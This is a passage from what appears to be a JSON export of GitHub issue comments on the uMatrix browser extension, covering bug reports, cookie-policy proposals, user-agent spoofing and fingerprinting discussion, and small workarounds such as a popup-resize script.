possibly-relevant places in the code and hope something means anything? :confused: \nWas trying to see if there's a point in the NoScript code where the channel still has its umatrixreqdata and where it doesn't, and go from there.  Now I'm trying to work backwards from the fact that disabling ABE gets it working.\n. OK here is what I think is going on.  (Testing NoScript 2.9.0.12rc1)\nNoScript uses redirectTo() method of HTTP channels and it is redirectTo() itself which is causing uMatrix data to be dropped.  If I comment out this line in NoScript's ChannelReplacement.js (making no other changes) then uMatrix works as expected:\nchan.redirectTo(this.newURI);\nI'm thinking it's not a NoScript bug per se but maybe Giorgio can at least work around it.\n. informaction: https://forums.informaction.com/viewtopic.php?f=10&t=21926\n. Yep, looks like a SeaMonkey bug - the windowtype of private window is an empty string, that's definitely not right.\nEDIT Cursory searching of Bugzilla doesn't turn up anything about this anomaly.\n. We've talked to the SeaMonkey devs, and got confirmation that A) this is indeed a SeaMonkey bug (likely affecting much more than just uBlock Origin & uMatrix), and B) your chosen work-around should be stable until it's fixed.\nApparently SeaMonkey is using removal of the windowtype attribute as its way of flagging private windows as private windows :confused:\nsomeone will be filing on Bugzilla about this soon, I will update this comment with the link\n\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1286672\n. Looks fixed in uMatrix 0.9.9b3 :smiley: . Fixed, thanks! :smiley: . \n",
    "bonanza123": "ahh okay. But some URL-based subscription method for this doesn't exist yet, right?\n. Okay, despite I would like that feature I also fully understand your point. Thanks for your extremely fast response.\n. @gorhill  sorry for the missing information. I hope here is everything that is needed:\nThe browsed website: http://de.mathworks.com/\nFirefox version 47.0.1\nuMatrix version 0.9.3.6\n. ",
    "genspk06": "I do not explicitely ask for subscriptions but is there any other way to automate rules updating among family members' browsers?\n. ok then, I don't know how I do that. Just letting you know.\n. ",
    "Kaganis": "Via the Chrome extension store.\n. Thanks for that!  Helps narrow down the problem somewhat.  It's actually a problem where the first device wouldn't upload the rules.  Going to try some more troubleshooting (might be hitting the chrome sync size limit mentioned).  Feel free to close this - if it's still a uMatrix problem I'll open a new issue with the pertinent info.  Thanks again!\n. ",
    "amithiel": "using chrome Version 56.0.2924.87 (64-bit) on OSX Sierra. umatrix 0.9.9b4 + ublock origin 1.11.0, bug still exists. window is cropped most of the time. ",
    "Kadigan": "Bug still there on Chrome Version 58.0.3029.81 (64-bit) @ macOS Sierra 10.12.4, using uMatrix v1.0.0. Very, very annoying (even if it ultimately isn't uMatrix's fault). My boss is pressuring me to remove it because it takes a lot of time to set anything.. ",
    "shazow": "In case this is helpful for anyone, this is a nasty dirty hacky workaround I'm using in another extension which seems to help:\njavascript\nsetTimeout(function() {\n    // Resize the window a tiny bit which forces a subtle rerender that\n    // fixes a bug where the popup is rendered in the wrong size initially\n    // sometimes.\n    document.body.style.height = window.innerHeight + 1 + \"px\";\n    setTimeout(function() {\n        // We can't remove the property too soon or otherwise it might happen\n        // before the popup render glitch. We'd rather not keep it either\n        // because the size of our widget can change after some UI flows.\n        document.body.style.removeProperty(\"height\");\n    }, 100);\n}, 200);. ",
    "ndavidow": "Perhaps a more elegant solution would be to show second level domains for any subdomains, even if there is no content loaded from the parent domain. Some exceptions should probably be made for certain expansive second level domains; eg the country TLD .uk has .gov.uk, .co.uk, etc, and it would not make sense to provide those in the matrix. Or just show a button to add a row for the parent domain, similar to how normal parent domains have a button to collapse.\n. ",
    "Magister": "This is very annoing - scrolling is very slow because of this...\n@dev-random did you managed to fix that locally? Now Firefox wants signed addons, so modifying it is not an option...\n. @dev-random Thanks a lot!\n. ",
    "dev-random": "@Magister \nabout:config\nextensions.umatrix.placeholderBackground\nurl(\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAAAAACoWZBhAAAABGdBTUEAALGPC/xhBQAAAAJiS0dEAP+Hj8y/AAAAB3RJTUUH3wwIAAgyL/YaPAAAACJJREFUCFtjfMbOAAQ/gZiFnQPEBAEmGIMIJgtIL8QEgtoAIn4D/96X1KAAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTUtMTItMDhUMDA6MDg6NTArMDM6MDAasuuJAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE1LTEyLTA4VDAwOjA4OjUwKzAzOjAwa+9TNQAAAABJRU5ErkJggg==\") repeat scroll #fff\n. ",
    "wu5oeDah": "@dev-random \nI've been waiting a long time for this too.\nThank you.\n. ",
    "jfrankenau": "I would love to see @dev-random's solution merged.\n. ",
    "HarryStottle": "Hole in one squire!\nDisabling UA spoofing fixed it.\nGrateful for the fix, but bemused at \"what changed overnight\"  (possibly for me only?) to make the fix necessary? 'snot like I switched UA spoofing ON. (That's the default, it's always been on, so far as I know)\nStill, that's not your problem. You've improved the human condition enough for one day!\n. ",
    "Okamoi": "Hi,\nWhat is the state of things regarding this issue with WebExtensions ? It is rather nice that websites are unable to detect blocking unless they have JavaScript.. It isn't assigned to a single tab but it is assigned to a single origin. The browser should communicate that origin to uMatrix one way or another, if it doesn't, I agree that it should be fixed. (So that it is a browser \"bug\"). Is it not because of this lack of origin reported by the browser that uMatrix 1.2.0 has to use an exceptional block/allow approach for WebWorkers themselves, rather than for network requests made by WebWorkers ?\nEssentially, why should WebWorkers receive a different treatment than regular JavaScript ? Both in terms of privacy, security or annoyance, they have the same potential.\nMiners sure are one reason to block the entire feature. But then uMatrix should provide a feature-blocking switch for Canvas, WebGL, WebAudio and multiple JS APIs that are abused for fingerprinting as soon as JS is allowed... While I don't disagree with such an approach, it's probably best unified under privacy.resistFingerprinting.\nService workers are the special kind of workers that can arguably be handled separately, but WebWorkers I don't understand ? For me, it is up to the browser to tell an add-on which origin a WebWorker belongs to, and then the add-on can filter WebWorker requests as it would with regular JS requests. (= I don't treat WebWorkers differently than JS). Thanks, so I'll suggest him browser.storage.local or IndexedDB instead of anything tied to the window object.\n\nDuplicate of #852. Fixed in current dev build.\n\nAh crap, sorry I did not notice it.\n\nI don't know what is \"CTRL+SHIFT+DEL interface\".\n\nI don't know how to access it without a shortcut these days. This one.\n. > This seems fixable if I inject a new CSP header instead of modifying an existing one -- which both uMatrix and uBO do. Speculating: this is probably a solution because it's allowed for servers to send more than one CSP header.\n\nUnfortunately, added response headers were not merged on Firefox 58 and less:\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1377689, so this means the fix here is a regression for FF58 and less.\n\n@gorhill I'm not sure what to conclude out of this, could you confirm or correct the following ?\nFirefox 59 merges headers with the same name, which includes CSP headers, when there is more than one add-on trying to modify them.\nSo now, can a website infer from the headers that I have both uMatrix and uBO installed ? I'd rather have them only able to infer I have uBO, as it has many users. uMatrix is more of an oddball unfortunately and I'd rather not stand out if possible.\nMore generally, what can the website figure out from headers if I have both uBO and uMatrix installed ? \nNote that this is a different question, the first one assumes uBO can be figured out and wishes to know if having uMatrix on top can go unnoticed. The second seeks to know if uBO and/or uMatrix are even distinguishable from one another, from another content blocker or from, I don't know, Firefox's Tracking Protection or even a network failure or a site bug.\nThanks!. ",
    "j1my3p1x": "Sounds good. I appreciate the response. I'll mark this as closed.\n. ",
    "qazip": "How is this going? I thought UMatrix was already ported to WebExtension... I agree, someone should fork umatrix and enable auto-reload. It's the one feature keeping me on noscript. . @elypter, you should re-do the readme to show that it's a fork and you should also mention the advantages of your version over gorhil's. And ofcourse, publish it on firefox' addons page.. ",
    "KenMacD": "I read that. The problem is that it didn't \"Do it's job as expected\". It gave no indication that anything was actually being blocked. The bug isn't \"This site breaks\", it's that \"uMatrix doesn't handle whatever magic Chrome is doing for u2f support\"\n. Sure. I think I've figured out more of the issue though. It appears there are columns in the plugin that I just can't see. (I've been using this for months and this is the first time I've realized)\nIn chrome://settings I have the  Web content Page zoom  set to 200%, because I use a high-dpi screen. If I set it back to to 100% I can see there's a 3 in the XHR column, and if I allow those then the page works as expected.\nSo I guess it's not a u2f issue, just a UI issue. At 200% and you see:\n\n. ",
    "IDLauncher": "... Since there's no real way for me to report my issue right now... the popup for UMatrix for me is not wide enough to display the whole matrix or the refresh button.\nhttp://i.imgur.com/OVx92fS.png\nThis post seemed... similar I guess.. ",
    "EC-O-DE": "Could there be a pin button on the menu to keep it open?. Pardon for asking :) I do know how uMatrix works. I use it and Opera's internal ad-blocking. I needed to ask to be sure. Coiners also work through obfuscated proxies injected into traffic that might look legit.\nHmm. I'm also pondering on to downsize the amount of lists (content) as some lists have same items and then there's separate Opera's ad-blocking (easylist). On uMatrix I've ticked of \"malware url\" lists (2) - as I'm pretty savvy and don't DL crap. But now I'm thinking maybe I should block...\n... But it increases RAM (& CPU) usage which is already quite high in uMatrix. Does it utilize gpu btw?. It used to consume like 40MB not it's at 100MB - even though I reset settings from time to time and start \"fresh\".. But still... ;). ",
    "kousu": "This is my question too: Mozilla featured uMatrix this month, after I just installed uBlock two months ago and now I'm confused. It's not clear to me if they are complimentary or redundant.\nWhat is the grand design here? @gorhill wrote that uBlock and uMatrix are forks of different aspects in HTTP Switchboard. Then this suggests that they are complimentary, but @gorhill has written at the top of it that it's out of date. uMatrix has the hosts file tab, which includes some of the same filter lists as uBlock. I would rather not use both if I don't need to, but I don't understand why they were split in the first place.\nI tried to get all my friends and even my Mom to use NoScript in the past. It didn't take because the startup cost with NoScript is too hard: too much to learn about network infrastructure and too many buttons to click in the way of just reading the news or buying crap on eBay. Ghostery's UI went over better, but u* are more attractive because they're fully FOSS I would like to start recommending it/them but I want to understand what I'm supposed to be recommending.\n. Then should we be installing both uBlock and uMatrix simultaneously?\n. We are asking for advice.  You have four blocking projects with overlapping and partially out of date wikis and it is not clear where each fits in. People can't formulate what they want without understanding what can be achieved. \nDoes uBlock completely replace AdBlock and Ghostery (are those essentially blacklists with different themes? And unlock subsumes both themes)?  What about HTTPS Everywhere or HTTP Nowhere? Or the various cookie management extensions?   Especially, is it redundant to install uBlock if I have uMatrix?  uBlock looks to me like an easier uMatrix, but some of the snippets I've read hint that they have different goals entirely. The trouble is I can't figure out how to describe those goals to myself.\nPlease, I'm just confused.\n. @Roman-Nopantski , uMatrix already offers allow and allow-as-first-party-only and deny modes, they're just phrased differently than you're used to:\n```\nlike Cookie Controller's \"allow\"\n\ndomain.com cookie allow\n\nlike Cookie Controller's \"allow as 1st party only\"\ndomain.com 1st-party cookie allow\n* domain.com cookie block\nlike Cookie Controller's \"deny\"\n\ndomain.com cookie block\n```\n\n(by the way, getting the * cases via the GUI is sorta tricky: you have to click the blue domain name of the site you're on in the top left corner and switch it to the black * mode, which represents the global scope, and then find the box for (domain.com, cookie) set it either to allow or deny. gorhill's matrix GUI is really efficient but it's almost too slick to learn).\n. Yet I am too unsatisfied with the cookie handling in uMatrix. I am not sure if this is just because I don't understand how to express what I want or if there's actually something missing, so I am going to explain what I do now and contrast it.\nUse Case\nI use SelfDestructingCookies and it has a similar design. It allows all cookies in and out as normal, but deletes them at different times. For each domain, you can:\n- (Red) -- delete cookies from that domain a short timeout after when you close all tabs on that domain (this is a tighter version of CC's allow-session: the session is only as long as you are interacting with the site, not as long as you have the browser in RAM, and with a grace period)\n- (Yellow) -- delete cookies from that domain a short timeout after you reopen the browser (this is like CC's allow-session, but with a grace period)\n- (Green) -- let the default policy apply: delete it when the cookie says to be deleted (including, possibly, never) (this is like CC's allow)\nBasically, I Green sites that I trust and also need to log in to, and leave everything else (even the sites I trust) at Red. I Yellow sites that I flip on and off of, like Facebook. I find yellow more convenient because in a single day at my desk I can check in with Facebook without having to relogin, but I don't need to idle online on it, and the timeout policy means that if I reopen my browser just to go back to Facebook, it still has me logged in.\nI think SDC's Yellow mode is an indulgence that I should learn to live without: cookie lifetime should be tied to when you're interacting with a site, not when you're using your computer, especially in light of the way mobile browsers try to pretend they aren't restarting all the time but actually totally are. So there's only Green and Red to worry about.\nProblems\nI can't replicate SDC's behaviour in uMatrix, as it is now. In some ways they looks very similar, which is why I am so confused. \"Delete non-blocked session cookies\" effectively changes the session cookie policy from the old HTTP default of delete-on-process-close (~= SDC's Yellow) to delete-on-page-close (~= SDC's red), but it only applies to whitelisted cookies, which contradicts my intuition (and SDC's schema) that force-timing out a cookie is a sort of blacklisting!\nI think what it comes down to is:\n- SDC Green means I trust the site to set permanent cookies\n- SDC Red means I only trust it for session cookies\nwhereas\n- uMatrix Whitelist means I trust the site to set both permanent and session cookies\n- uMatrix Blacklist means I do not trust the site for any cookies\nSuggestions\nAfter thinking it through, here is my suggestion. Combine the features of SDC and uMatrix with a tri-state cookies rule:\n- Whitelisting: allow permanent cookies (colour in Green or Yellow, or White)\n- Greylist: force session cookies (colour in Yellow or Violet, or Grey)\n  - that is, any permanent cookies are rewritten to be session cookies\n  - ..you'd have to add to your rules parser; right now you only have 'allow' and 'block'; sorry about that.\n- Blacklist: block cookies (colour in Red or Blue or Black)\nAlso, please reword the Dashboard to be easier to interpret (I know about cookies and I still had to re-read \"Delete non-blocked session cookies\" 3 times at least to figure out what it was saying): \n- Instead of \"Delete blocked cookies\", make that feature non-optional (why would I want to keep blocked cookies around?) and drop it from the UI.\n- Rename \"Delete non-blocked session cookies\" to \"Cookie Timeout\"\n  - Save the string \"Session Cookie\" and other technical details for the help popup\n    - it's just confusing for those most people who do not know cookies come in multiple flavours but just sort of have this vague anxiety about corporations infecting their computer with data\n    - Please do give technical details of what counts as an \"interaction\" though: is it making a request or keeping a page open?\n  - If this isn't already the case, count a domain active while tabs from it are open (or maybe tabs that include content from that domain?  the former has better user control, but probably breaks assumptions about how the web works; is it a bad thing if third party cookies get lost accidentally?), so cookies are wiped after a timeout after the last tab is closed.\nIf you made this change,\n- SDC Green is almost equivalent to uMatrix whitelisting\n  - A whitelisted session cookie will still be affected by Cookie Timeout. SDC Green'd session cookies will actually last until the end of the process. The difference doesn't matter\n- SDC Yellow is uMatrix greylisting\n  - Except that I cannot set per-site Yellow mode, but that is a small loss; I can either get by with a longer timeout or with whitelisting but being conscientious about logging out, or, on some sites, telling the site to invalidate my session after a period.\n- SDC Red is uMatrix greylisting + Cookie Timeout\n. Oh! I just had another idea to chew on. Instead of Cookie Timeout triggering a timer, greylisting could rewrite everything as a permanent cookie with short lifetime (except for permanent cookies with a shorter lifetime), and the lifetime could be pulled from Cookie Timeout. It's not like session cookies are any more private than permanent ones; if anyone is storing sensitive data that should never hit the disk in the cookies they send you they're doing it wrong. This is a much simpler implementation, though it doesn't obviously lend itself to the keep-my-cookies-while-i'm-looking-at-the-site feature.\n. ",
    "handy1957": "I will give it a test drive and see what happens.  Thank you\n. ",
    "alex-theoto": "For seamonkey this happens when you start private session\n. Ops, I'm sorry. Something messed up on seamonkey's local files.\nI removed user's config files and now seamonkey and umatrix works fine.\nNow I can see it at their addons.\n. ",
    "Offnfopt": "I think you misunderstood my request. I don't have any problems with sites that are blocked, I just want a option to hide the main-blocked.html instead of displaying it. So the logic would be a option in settings that allows you to hide the main-blocked.html page i.e. if a site is blocked, instead of displaying main-blocked.html it would just be quietly blocked without notification to the user via main-blocked.html page.\n. No, I meant the page would be blocked like usual but there would be no indication to the user. Say a page did a pop-up/under and the domain was blocked, instead of showing main-blocked.html it wouldn't show anything, so basically the blocked page would be closed and there would be no indication to the user. I'm asking for this feature because I spend time closing a bunch of tabs that show the main-blocked.html page, but if there was a setting to not show blocked pages (the main-blocked.html page) and just quietly block the sites then I wouldn't spend any time having to close these pages.\n. ",
    "crssi": "Idea of a User-Agent JS Fixer is a good one... but unfortunately it doesn't work completely and is a half measure.\nMost completed is Random Agent Spoofer, which has also other problems.\n. I am on Win 8.1 x64., FF 45 ESR, uMatrix, User-Agent JS Fixer and NoScript in Allow JS mode.\nSpoofed UA on uMatrix: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36\nGoing to: http://browserspy.dk/os.php\nResults:\nOperating System: Linux/Unix\nOS detected via jQuery: win\nOS detected via platform: Win64 - Windows 64bit\nOS CPU detected via JavaScript: Windows NT 6.3; Win64; x64 \nSee the discrepancies here... and we can go on.\nI dont really know what exactly does work on your side, but you might have missed something, or I am?\nNotice: by UA spoof, I should be on Linux/Ubuntu., but thats UA says, otherwise I am clearly detected to be really on Win 8.1 x64.\nAnd on http://browserspy.dk/browser.php:\nnavigator.appName   Mozilla\nnavigator.appCodeName   Mozilla\nnavigator.appVersion    5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36\nnavigator.appMinorVersion   Property is not supported! navigator.appMinorVersion is not a string. It's a undefined\nnavigator.vendor\nnavigator.userAgent     Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36 . More info...\nnavigator.oscpu     Windows NT 6.3; Win64; x64 . More info...\nnavigator.platform  Win64\nnavigator.securityPolicy    Property is not supported! navigator.securityPolicy is not a string. It's a undefined . More info...\nnavigator.onLine    true . More info...\nInfo browser.name   chrome\nInfo browser.version    49.0.2623.108\nInfo layout.name    webkit\nInfo layout.version     537.36\nInfo os.name    win\nInternet Explorer real version  This only works in Microsoft Internet Explorer!\nOperating System    Microsoft Windows NT - More info...\n. I have sad that here mentioned workaround using \"User-Agent JS Fixer\" to fix the problem wont work and if you take a look in the output I have paste in the upper post, you can see that it doesnt work.\nNow you are talking about other things and you are deviating out of focus here.\nThe browser enumeration tricks to detect browser you mentioned can be remediated with https://addons.mozilla.org/en-US/firefox/addon/no-resource-uri-leak/\nand test it over https://www.browserleaks.com/firefox before and after.\nSo I really dont understand the struggle here and finding all king of excuses... I know that there are other stuff, but lets focus only to UA spoof here.\nI think it would be really easy to implement for someone like gorhill into uMatrix to get the whole UA spoof sollution... in the chrome://umatrix/content/dashboard.html#privacy under UA list, if there would be and option (after some sort of separation in the same line) to enter the following preferences (there might be some too many and some missing):\ngecko.buildID\ngecko.mstone\ngeneral.appname.override\ngeneral.appversion.override\ngeneral.buildID.override\ngeneral.oscpu.override\ngeneral.platform.override\ngeneral.useragent.vendor\ngeneral.useragent.vendorsub\nSo when uMatrix changes the \"general.useragent.override\" it can at the same time change also the upper preferences if listed and with that the end-user could set-up this thing and get better control.\nRandom Agent Spoofer does this as it should... and its the shame that uMatrix doesnt. :(\nI really like the option to control UA only over uMatrix, but at this time it is a half-measure.\nWhite listing in RAS doesnt work and controlling this stuff only over uMatrix would be best.\nIf JS fixer would work correclty then this would not be a question to have nice workaround... but it is not working correctly.\nDont get me wrong, I really admire the gorhill work here, just tring to get things even better.\n. @berrythesoftwarecodeprogrammar \nIt works for you because you are using Random Agent Spoofer, which is working correctly. ;)\n. OK... got it. I would like to deeply thank you for your explanation and your time to answer me.\nHave a nice weekend\ncheers\n. That's normal, since you get rid of the cookies upfront already.\nIf you visit 1st party page with cookies allowed that would not happen.\nI have 1st party cookies allowed and I am using then \"Self-Destructing Cookies\" extension, which deals with the cookies and other sort of super-cookies really good.\nOn the other hand, if you wish that cookies stayes intact, go to uMatrix Dashbboard -> Privacy and UnTick \"Delete blocked cookies\" and \"Delete non-blocked session cookies...\"\n. Oh... sorry, now I feel stupid. ;)\nAt least I have been more specific and which preferences are in question.\nThe other discussion is old, is there some plan for improvement?\nCan I help in any way?\n. Firefox 45 ESR and FF 49. Tested with uMatrix for UA spoof and with and without UA JS Fixer.\nI normally dont use UA spoof anymore, since I have a feeling that this is futile, but every once and then I test all kind of stuff. ;)\n. ",
    "pointyointment": "Cannot reproduce. bbc.co.uk seems to have been redirected to bbc.com today, so I can't go there to take a screenshot of what I saw. Therefore I agree with closing this.\n. ",
    "dragetd": "This issue could be treated as a request for better documentation. I was reading through the documentation and could not magically forsee that this information is hidden within a chapter about differences to another plugin I have not used before.\nWould you accept PRs regarding improving the documentation of these things?\n--- For other people stumbling over this issue and actually looking for an answer ---\nTaken form https://github.com/gorhill/httpswitchboard:\nDark red means there is an explicit rule that forbids exactly this element. Light red means it is forbidden because of an inherited rule / above scpe\u2026 i.e. the top domain is forbidden, thus elements under it are implicitly forbidden.\nDark green is explicitly whitelisted, light green implicitly via an above scope.\nThe tiny triangle at the top left is for the permanent setting for this cell (Each time you change a cell, it is temporary at first until you click the lock icon).. FYI: uMatrix is listed for mobile devices (Android 7.1 / FireFox) and can be installed without issues.\nIt only stays greyed out under the settings.\nNot sure if this is a mozilla bug or if the package was labled as android compatible by chance.. Hmm, you are correct. I googled for 'umatrix firefox' and directly landed on https://addons.mozilla.org/de/firefox/addon/umatrix/ via mobile android. And this site does not tell you anything about incomparability - it shows a button to install and even says it installs successfully when using it. But I guess that is an issue on mozillas side!. ",
    "sleek22": "@dragetd,\nThank you for your comment.\nIt answered a lot of questions that I had also.. If you have uBlock Origin, you can try using Inline Script Tag Filtering.\nI wanted the Forbes print article page without the print pop-up. I wrote the following filter in uBlock Origin to block it:\nforbes.com##script:contains(print)\nThe reference page to Inline Script Tag Filtering is here:\nhttps://github.com/gorhill/uBlock/wiki/Inline-script-tag-filtering. ",
    "SINE": "Jesus, sorry, I forgot the most important info. Indeed, it was the version 0.9.3.1 on AMO - I will make sure to test the dev channel now.\n. Issue seems to be fixed.\nI would like to add a big thank you for your great work.\nHave a good one.\n. ",
    "KlipperKyle": "I should probably post some version numbers:\n- uMatrix 0.9.3.2 (from addons.mozilla.org)\n- SeaMonkey 2.39\n- Arch Linux x86_64\n. ",
    "umatrix-user": "New, prospective user of uMatrix here - planning to move from NoScript + RequestPolicy + ABP.\nuMatrix looks to be the extension making the other 3 obsolete, you have been doing an excellent job, Raymond!\nI do have a related problem here on SeaMonkey 2.40, settings are not saved/remembered between sessions at all. Whenever I start the browser, it just comes up with all default settings. Not only hosts files are forgotten, but everything. Yes, I do have a global password set up in SeaMonkey (SeaMonkey 2.40,\nuMatrix 0.9.3.3, Windows7 x86).\nWith OP over 2 months ago, do you need a hand with this, perhaps?\n. ",
    "dag": "I think the issue raised here is real although only for up to 120s if you enabled deletion of blocked cookies.  I understand the technical limitations of the browsers preventing efficient and reliable means of instantly deleting blocked cookies.  I think for most people the best recommendation is to disable third-party cookies in the browser all together; I haven't noticed it breaking anything important for me.\nHowever it might be possible to solve this issue anyway by running the cookie deletion sweep not just on a timer but on events where the definition of the current 1st party changes?  Such as visiting a new domain or switching tab/window?  Not sure that's still foolproof but perhaps an improvement.\nIn practice I'm not sure how big an issue this is if you configure uMatrix to strip the Referer header from third-party requests, but theoretically things like social media widgets might send the \"referrer\" in some other, more explicit way, such as in a URL parameter or in POST data to retrieve the \"like\" count for the article you're reading or whatever.  If you then visit that social network (before blocked cookies are deleted) it could know you read that article, despite uMatrix.  Of course the same can be said for any type of browser fingerprinting, which is difficult to protect against, but in this scenario the tracker isn't even making an effort to circumvent privacy protection, it's just a side effect of normal tracking plus incidental non-reliance on the referer header.\n. I do have them added myself, and I agree most of these probably should not be enabled by default.  But I thought it could be nice to have them available as standard options, particularly combined with #526 since custom added lists don't have any names or descriptions.  It would also be nice if it listed the lists listing the blocked host when it blocks a host (nice sentence there) so if you visit a bittorrent site you get a message saying \"blocked by these lists: WRZ - Warez\" and you're better informed to add an exception if you want.\nIs there any performance impact to having lists available but not enabled?  I can only imagine it as a UI issue, having too many lists available, but uMatrix could group lists like uBlock does and there could be a group \"hpHosts classifications\" or something.\n\nI don't understand why they wouldn't just block the whole damn domain instead.\n\nI don't think hosts files normally work like that.  I think it might be a special case of blocking tools like uMatrix.  The hosts file is not originally meant for blocking, but rather a static DNS lookup table.  So if you just route 127.0.0.1 example.com in a hosts file that has no effect on www.example.com.\n\nIf you don't allow scripts even for 1st party, and considering you'll probably never come across 90+% of the domains in those lists, there's zero risk from not having those domains in the list, and it's just not worth the performance impact, no matter how small.\n\nI prefer to allow 1st-party scripts, but I do block everything 3rd-party by default.  Technically I could do completely without hosts lists but I like seeing which third-parties are more questionable to whitelist and I like being able quickly allow 3rd-party css and images while still blocking ads and such.  I also like that hosts files block even 1st-party requests in case I'm baited to click a link to a malware site or whatever.  I like being informed, and the hpHosts classifications give me more granularity.\n. > Would you mind sharing how many blocked hostnames you currently have?\n451,513 distinct blocked hostnames\nBut I'm in an experimental stage of figuring out the setup that best suits me, so tomorrow that number might be zero or I might be using uBlock0 instead etc etc.  ;-)  Currently it's mostly for the fun of seeing how many third-parties sites try to connect with that are blacklisted in ANY hosts file I can find.  I guess that's also in part why I'm interested in being able to see which list the blocking originates from: are the third-parties all just ads and trackers, or ever something potentially more malicious?\nSo, thinking this through more maybe I agree with closing this ticket.  My use case is highly specialized.  Still, @gorhill, did you consider adding ANY of these lists?  Some of them MIGHT arguably still be useful, considering you already include other malware lists for example.\nAnyway, thanks for two verily awesome tools.\n. Agreed.  I'll add that idea to #526.\n. ",
    "pipebomb": "Wow, I didn't know about this! \nThank you for the hasteful reply and for amazing work! Cheers.\n. ",
    "DarkAlchy": "I don't think you are getting it or maybe you don't wish to but this site knows when umatrix is being used and even has gone so far as to inject a special cookie when used.  I guess it can't stealth or basically it is like adblockers when the website does a popup saying you are using one.\n. I also would like to know about this part because this is the part that always confused me...\nuMatrix can be set to work in allow-all/block-exceptionally mode with a single click on the all cell in the global scope *, if you prefer to work this way. This will of course break less sites\nI have it set up like that but the site is still broken but why?  Here is another one, as I mentioned but was skimmed over, but if I turn off umatrix would think it wouldn't matter but once a site is broken it stays broken as long as umatrix is installed regardless of the on/off button or the allow all.  Why is that?  I mean does it not really get out of the way when turned off?\n. ",
    "Lunatrius": "Wouldn't an editor similar to dashboard.html#user-rules work for this?\n<meta-host> <host> <applies-to-what>\ngithub-bundle github.com *\ngithub-bundle githubapp.com *\ngithub-bundle githubusercontent.com *\nyoutube-embed googlevideo.com *\nyoutube-embed youtube.com *\nyoutube-embed youtube.com frame\nyoutube-embed ytimg.com *\n. ",
    "Rukachan": "This is implemented in uBlock.\n. I can confirm it with Firefox esr 45.0.1 and used as well to happen with Iceweasel 44.\nThe version is 0.9.3.3.\nIt does not happen only when restaring the browser but completely randomly (unlike what the previous poster claims). I think it usually happens when visiting some sites sometimes.\nTo me it is not getting placed to \"Additional Tools and Features\" but it disappears completely.\nThe way I fix it is to either disable and re-enable the addon or if it doesn't work restart the browser.\n. @gorhill I do not have this option at all.\n. ",
    "xSmurf": "NoScript does have a per domain option to allow them yeah. \n. ",
    "coffeemakr": "I think the reason why the script column is empty is because the JavaScript code is embedded in the HTML code and not an external resource which was blocked. \nIn this case uMatrix prevents the execution of the script but does not block a resource.\n. uMatrix expects the entire settings dump as the input file.\nI think this issue is caused by a file type check. Try saving the file as something.txt and it should work fine.\nWhat filename did you use?\nRegards\n. ",
    "mbme": "sounds great, but how should uMatrix guess actual browser versions?\n. this issue might happen because of user agent spoofing\n. ",
    "KOLANICH": "of course from repos:\nhttps://github.com/mozilla/gecko-dev/blob/master/dom/base/Navigator.cpp\nhttps://chromium.googlesource.com/chromium/src.git/+/master/content/common/user_agent.cc\nhttps://chromium.googlesource.com/chromium/src.git/+/master/components/version_info/version_info.cc\nhttps://trac.webkit.org/browser/trunk/Source/JavaScriptCore/Configurations/Version.xcconfig\nPS I don't think it is a good idea to change useragents because it is possible to detect browser engine in another way and if the useragent and the detected engine mismatch, this means that the user uses this feature. The share of users using such features is small which means that this is information-rich fingerprintable parameter.\n. ",
    "a13ph": "@sleek22 use one of many unloading addons instead, like \"Auto Unload Tab\", which is probably the most powerful/bloated one, or any other one from bartab/unload families\nin Auto Unload Tab you can set auto unloading to be really low timeout, though not less than a minute. \nProbably more precise would be to set maximum of loaded tabs to 1.\nThere are lots of options, so see for yourself\n. ",
    "Droyk": "@gorhill commented on Feb 18, 2016, 4:37 AM GMT+5:30:\n\nPlease do not use issue trackers as replacement for a forum.\n\nHey @gorhill  Sorry I should have posted it there but now i posted it plz tell me answers i want thanxx\nhere is the link  https://discourse.mozilla-community.org/t/support-umatrix/5131/7\n. @benoit-pierre commented on Feb 20, 2016, 12:55 AM GMT+5:30:\n\nHow about you stop spamming the tracker and read the actual documentation?\n\nI am not spamming I just want to know the answers of some questions that's all Tell me where in documentation written the answers of these questions \n\n3rd If I really have 2 have another ad blocker for ad blocking for e.g. ublock+umatrix how much memories these 2 extensions are going to capture and after using umatrix for 1 day straight I have to say that my page\u2019s load slow sometimes I don't know why though .............they shouldn't be right :(....and plz tell me how much cpu power they will take too?\n4th why you guys didn't add element picker in umatrix ...like you did in ublock\n5th after using umatrix for the whole day ...I have to say that it breaks the pages a lot ..so if a user need's to fix that user have to turn the script button green this thing fixes almost 70% of pages and now for the remaining 30% of the pages that breaks after enabling the script option I have to enable XHR,OTHER , and sometimes iframe too...............by doing this I have to say that it's a tedious task I browse 100 to 200 websites a day....and by enabling and testing these options almost takes some seconds too some minutes now multiply whole testing thing by number of websites I visit everyday\nso the answer would be it takes away too much time. even if I use the lock option to save my setting's there is no guarantee that I am going to see the site again .... Every day I browse 50 to 60 new sites for some of college project's....................So in conclusion is there is any way to make script, XHR and other a default enables on every website Plz tell me there is a way to do that\n6th So I wanted to replace my ublock to umatrix but there aren't many host's in the umatrix so what I did is add custom url's from ublock to umatrix \nThe below written hosts I added into the umatrix.... plz tell me I did the correct thing and if there are any missing host that I didn't add plz tell 